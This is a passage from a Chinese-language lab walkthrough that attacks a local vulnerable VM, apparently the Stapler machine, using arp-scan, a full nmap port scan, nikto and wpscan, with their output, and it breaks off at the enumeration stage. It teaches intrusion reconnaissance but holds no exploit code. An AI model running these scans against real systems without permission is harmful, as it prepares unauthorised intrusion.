<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ip addr show</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 08:00:27:1f:30:76 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.1.20/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0</span><br><span class="line">       valid_lft 3558sec preferred_lft 3558sec</span><br><span class="line">    inet6 240e:39a:186:e200:ec6d:db1d:6a19:e445/64 scope global temporary dynamic </span><br><span class="line">       valid_lft 259160sec preferred_lft 86206sec</span><br><span class="line">    inet6 240e:39a:186:e200:a00:27ff:fe1f:3076/64 scope global dynamic mngtmpaddr noprefixroute </span><br><span class="line">       valid_lft 259160sec preferred_lft 172760sec</span><br><span class="line">    inet6 fe80::a00:27ff:fe1f:3076/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
<p>arp-scan扫描结果如下，根据靶机的MAC地址，确认靶机IP为：192.168.1.19。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 08:00:27:1f:30:76, IPv4: 192.168.1.20</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     44:a1:91:05:b1:e3       HUAWEI TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.1.14    bc:a8:a6:ec:08:06       Intel Corporate</span><br><span class="line">192.168.1.19    08:00:27:a5:22:5a       PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.6     60:14:66:b4:f8:f8       zte corporation</span><br><span class="line">192.168.1.5     28:16:a8:64:e4:4e       Microsoft Corporation</span><br><span class="line">192.168.1.11    78:0f:77:fd:01:b4       HangZhou Gubei Electronics Technology Co.,Ltd</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.160 seconds (118.52 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>
<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap扫描结果如下：<code>nmap -T4 -A -vvv -p- 192.168.1.19</code>这条命令扫描出的结果更全面。我们发现靶机开放的端口很多，包括：21（ftp服务）、22（ssh服务）、53（dns服务）、80（http服务）、139（smb服务）、666（未知服务）、3306（mysql服务）、12380（http服务）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nmap -T4 -A -vvv -p- 192.168.1.19</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 07:57 EST</span><br><span class="line">NSE: Loaded 151 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 07:57</span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed                                                               </span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.                                                               </span><br><span class="line">Initiating NSE at 07:57                                                                             </span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed                                                               </span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.                                                               </span><br><span class="line">Initiating NSE at 07:57                                                                             </span><br><span class="line">Completed NSE at 07:57, 0.00s elapsed                                                               </span><br><span class="line">Initiating Ping Scan at 07:57                                                                       </span><br><span class="line">Scanning 192.168.1.19 [2 ports]                                                                     </span><br><span class="line">Completed Ping Scan at 07:57, 0.00s elapsed (1 total hosts)                                         </span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 07:57</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 07:57, 6.52s elapsed</span><br><span class="line">DNS resolution of 1 IPs took 6.52s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]</span><br><span class="line">Initiating Connect Scan at 07:57</span><br><span class="line">Scanning 192.168.1.19 [65535 ports]</span><br><span class="line">Discovered open port 3306/tcp on 192.168.1.19</span><br><span class="line">Discovered open port 21/tcp on 192.168.1.19</span><br><span class="line">Discovered open port 22/tcp on 192.168.1.19</span><br><span class="line">Discovered open port 139/tcp on 192.168.1.19</span><br><span class="line">Discovered open port 53/tcp on 192.168.1.19</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.19</span><br><span class="line">Connect Scan Timing: About 22.87% done; ETC: 08:00 (0:01:45 remaining)</span><br><span class="line">Connect Scan Timing: About 41.39% done; ETC: 08:00 (0:01:26 remaining)</span><br><span class="line">Discovered open port 12380/tcp on 192.168.1.19</span><br><span class="line">Connect Scan Timing: About 60.60% done; ETC: 08:00 (0:00:59 remaining)</span><br><span class="line">Discovered open port 666/tcp on 192.168.1.19</span><br><span class="line">Completed Connect Scan at 08:00, 132.12s elapsed (65535 total ports)</span><br><span class="line">Initiating Service scan at 08:00</span><br><span class="line">Scanning 8 services on 192.168.1.19</span><br><span class="line">Completed Service scan at 08:00, 11.19s elapsed (8 services on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.19.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 08:00</span><br><span class="line">NSE: [ftp-bounce 192.168.1.19:21] PORT response: 500 Illegal PORT command.</span><br><span class="line">NSE Timing: About 99.91% done; ETC: 08:00 (0:00:00 remaining)</span><br><span class="line">Completed NSE at 08:00, 31.04s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 08:00</span><br><span class="line">Completed NSE at 08:00, 0.04s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 08:00</span><br><span class="line">Completed NSE at 08:00, 0.00s elapsed</span><br><span class="line">Nmap scan report for 192.168.1.19</span><br><span class="line">Host is up, received syn-ack (0.0018s latency).</span><br><span class="line">Scanned at 2020-03-06 07:57:52 EST for 181s</span><br><span class="line">Not shown: 65523 filtered ports</span><br><span class="line">Reason: 65523 no-responses</span><br><span class="line">PORT      STATE  SERVICE     REASON       VERSION</span><br><span class="line">20/tcp    closed ftp-data    conn-refused</span><br><span class="line">21/tcp    open   ftp         syn-ack      vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can&#x27;t get directory listing: PASV failed: 550 Permission denied.</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.1.20</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp    open   ssh         syn-ack      OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul</span><br><span class="line">|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=</span><br><span class="line">|   256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ9wvrF4tkFMApswOmWKpTymFjkaiIoie4QD0RWOYnny</span><br><span class="line">53/tcp    open   domain      syn-ack      dnsmasq 2.75</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: dnsmasq-2.75</span><br><span class="line">80/tcp    open   http        syn-ack      PHP cli server 5.5 or later</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">123/tcp   closed ntp         conn-refused</span><br><span class="line">137/tcp   closed netbios-ns  conn-refused</span><br><span class="line">138/tcp   closed netbios-dgm conn-refused</span><br><span class="line">139/tcp   open   netbios-ssn syn-ack      Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">666/tcp   open   tcpwrapped  syn-ack</span><br><span class="line">3306/tcp  open   mysql       syn-ack      MySQL 5.7.12-0ubuntu1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.7.12-0ubuntu1</span><br><span class="line">|   Thread ID: 10</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, Support41Auth, ConnectWithDatabase, SupportsCompression, SupportsTransactions, LongPassword, ODBCClient, LongColumnFlag, Speaks41ProtocolOld, FoundRows, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: e~\x1C\x1EUPi .vp;2F0oI#IW</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">12380/tcp open   http        syn-ack      Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Tim, we need to-do better next year for Initech</span><br><span class="line">Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 7h59m58s, deviation: 1s, median: 7h59m58s</span><br><span class="line">| nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   RED&lt;00&gt;              Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   RED&lt;03&gt;              Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   RED&lt;20&gt;              Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| Statistics:</span><br><span class="line">|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 15772/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 4705/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 17120/udp): CLEAN (Failed to receive data)</span><br><span class="line">|   Check 4 (port 35387/udp): CLEAN (Failed to receive data)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)</span><br><span class="line">|   Computer name: red</span><br><span class="line">|   NetBIOS computer name: RED\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: red</span><br><span class="line">|_  System time: 2020-03-06T21:00:22+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-03-06T21:00:21</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 08:00</span><br><span class="line">Completed NSE at 08:00, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 08:00</span><br><span class="line">Completed NSE at 08:00, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 08:00</span><br><span class="line">Completed NSE at 08:00, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 181.33 seconds</span><br></pre></td></tr></table></figure>
<h2 id="看看666端口"><a href="#看看666端口" class="headerlink" title="看看666端口"></a>看看666端口</h2><p>在浏览器输入url：<a href="http://192.168.1.19:666/">http://192.168.1.19:666/</a><br>页面返回结果是以<code>PK</code>开头的一长串乱码，说明这是一个zip文件。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckikt8e5sj31et0qa7hm.jpg" alt="image.png"><br>于是我们通过wget将这个zip文件下载到本地。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wget http://192.168.1.19:666 -O 666.zip</span><br><span class="line">--2020-03-06 08:13:03--  http://192.168.1.19:666/</span><br><span class="line">Connecting to 192.168.1.19:666... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9</span><br><span class="line">Length: unspecified</span><br><span class="line">Saving to: ‘666.zip’</span><br><span class="line"></span><br><span class="line">666.zip                      [ &lt;=&gt;                               ]  11.34K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2020-03-06 08:13:03 (46.3 MB/s) - ‘666.zip’ saved [11608]</span><br></pre></td></tr></table></figure>
<p>解压这个zip文件，得到一张图片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ unzip 666.zip </span><br><span class="line">Archive:  666.zip</span><br><span class="line">  inflating: message2.jpg </span><br></pre></td></tr></table></figure>
<p>打开图片看看：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckiqg06jfj30pf0q3ams.jpg" alt="image.png"><br>查看这张图片的详情：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ strings message2.jpg </span><br><span class="line">JFIF</span><br><span class="line">vPhotoshop 3.0</span><br><span class="line">8BIM</span><br><span class="line">1If you are reading this, you should get a cookie!</span><br><span class="line">8BIM</span><br><span class="line"><span class="meta">$</span><span class="bash">3br</span></span><br><span class="line"><span class="meta">%</span><span class="bash">&amp;<span class="string">&#x27;()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span></span></span><br><span class="line">        #3R</span><br><span class="line">&amp;&#x27;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span><br><span class="line">/&lt;&#125;m</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"><span class="string">,xr?</span></span></span><br><span class="line">u-o[</span><br><span class="line">Sxw]</span><br><span class="line">v;]&gt;</span><br><span class="line">|_m7</span><br><span class="line">l~!|0</span><br><span class="line">&lt;Elu</span><br><span class="line">I[[k:&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"><span class="string">5[^k</span></span></span><br><span class="line">;o&#123;o</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"><span class="string">xgH</span></span></span><br><span class="line">mCXi</span><br><span class="line">PE&lt;R&quot;</span><br><span class="line">umcV</span><br><span class="line">g[Y@=</span><br><span class="line">[\Y_</span><br><span class="line">\Oku</span><br><span class="line">&#x27;X|(</span><br><span class="line">?=?i</span><br><span class="line">//Do</span><br><span class="line">1okb</span><br><span class="line">,&gt;,&amp;</span><br><span class="line">n&lt;;oc</span><br><span class="line">*?      xC</span><br><span class="line">~ |y</span><br><span class="line">6&#123;M6</span><br></pre></td></tr></table></figure>
<h2 id="12380端口有什么"><a href="#12380端口有什么" class="headerlink" title="12380端口有什么"></a>12380端口有什么</h2><p>我们发现12380端口可以使用http和https打开。看了http的网页源码没发现什么有价值的内容。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckj8kadnzj316g0p37wh.jpg" alt="image.png"><br>于是，使用<a href="https://www.cnblogs.com/longronglang/p/7532852.html">nikto</a>扫描这个https端口，扫描结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nikto -host https://192.168.1.19:12380/</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.1.19</span><br><span class="line">+ Target Hostname:    192.168.1.19</span><br><span class="line">+ Target Port:        12380</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</span><br><span class="line">                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</span><br><span class="line">+ Start Time:         2020-03-06 08:31:20 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ Uncommon header &#x27;dave&#x27; found, with contents: Soemthing doesn&#x27;t look right here</span><br><span class="line">+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span><br><span class="line">+ The site uses SSL and Expect-CT header is not present.</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)</span><br><span class="line">+ Entry &#x27;/admin112233/&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ Entry &#x27;/blogblog/&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.</span><br><span class="line">+ Hostname &#x27;192.168.1.19&#x27; does not match certificate&#x27;s names: Red.Initech</span><br><span class="line">+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ Uncommon header &#x27;x-ob_mode&#x27; found, with contents: 1</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /phpmyadmin/: phpMyAdmin directory found</span><br><span class="line">+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-03-06 08:35:08 (GMT-5) (228 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
<p>我们发现这几个路径：<code>/admin112233/</code>、<code>/blogblog/</code>、<code>/phpmyadmin/</code>。<br>访问url：<a href="https://192.168.1.19:12380/admin112233/">https://192.168.1.19:12380/admin112233/</a> 这就是个整蛊游戏，不管它。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckjdcb7i8j30zl0oadh3.jpg" alt="image.png"><br>访问url：<a href="https://192.168.1.19:12380/blogblog/">https://192.168.1.19:12380/blogblog/</a> 这是博客。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckjekmehbj30zn0p1mz9.jpg" alt="image.png"><br>访问url：<a href="https://192.168.1.19:12380/phpmyadmin/">https://192.168.1.19:12380/phpmyadmin/</a> 这是php管理后台。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckjfof3qej30zn0p0jt8.jpg" alt="image.png"></p>
<h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p>我们使用wpscan爆破博客相关的url路径。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wpscan --url https://192.168.1.19:12380/blogblog --disable-tls-checks</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.7.6</span><br><span class="line">                               </span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: https://192.168.1.19:12380/blogblog/</span><br><span class="line">[+] Started: Fri Mar  6 08:54:38 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] https://192.168.1.19:12380/blogblog/</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line"> |  - Dave: Soemthing doesn&#x27;t look right here</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] https://192.168.1.19:12380/blogblog/xmlrpc.php</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  - Link Tag (Passive Detection), 30% confidence</span><br><span class="line"> |  - Direct Access (Aggressive Detection), 100% confidence</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] https://192.168.1.19:12380/blogblog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: https://192.168.1.19:12380/blogblog/wp-login.php?action=register</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: https://192.168.1.19:12380/blogblog/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] https://192.168.1.19:12380/blogblog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://192.168.1.19:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"> |  - https://192.168.1.19:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: bhost</span><br><span class="line"> | Location: https://192.168.1.19:12380/blogblog/wp-content/themes/bhost/</span><br><span class="line"> | Last Updated: 2019-12-08T00:00:00.000Z</span><br><span class="line"> | Readme: https://192.168.1.19:12380/blogblog/wp-content/themes/bhost/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4.4</span><br><span class="line"> | Style URL: https://192.168.1.19:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1</span><br><span class="line"> | Style Name: BHost</span><br><span class="line"> | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...</span><br><span class="line"> | Author: Masum Billah</span><br><span class="line"> | Author URI: http://getmasum.net/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.9 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https://192.168.1.19:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: &#x27;Version: 1.2.9&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;=======================&gt; (21 / 21) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Fri Mar  6 08:54:42 2020</span><br><span class="line">[+] Requests Done: 66</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 14.362 KB</span><br><span class="line">[+] Data Received: 14.436 MB</span><br><span class="line">[+] Memory used: 168.039 MB</span><br><span class="line">[+] Elapsed time: 00:00:03</span><br></pre></td></tr></table></figure>
<p>从爆破出来的url中，发现wordpress有一个存在漏洞的插件。<a href="https://192.168.1.19:12380/blogblog/wp-content/plugins/">https://192.168.1.19:12380/blogblog/wp-content/plugins/</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckki5o3xxj31bk0ofk3i.jpg" alt="image.png"><br><a href="https://windsorwebdeveloper.com/stapler-1-vulnhub-walkthrough/">待续</a></p>
<h2 id="21端口ftp服务"><a href="#21端口ftp服务" class="headerlink" title="21端口ftp服务"></a>21端口ftp服务</h2><p>用户名：anonymous，密码：Harry<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gckjvvy8agj30nj0notdh.jpg" alt="image.png"></p>
<h2 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h2><p><code>kali@kali:~$ enum4linux -A 192.168.1.19</code></p>
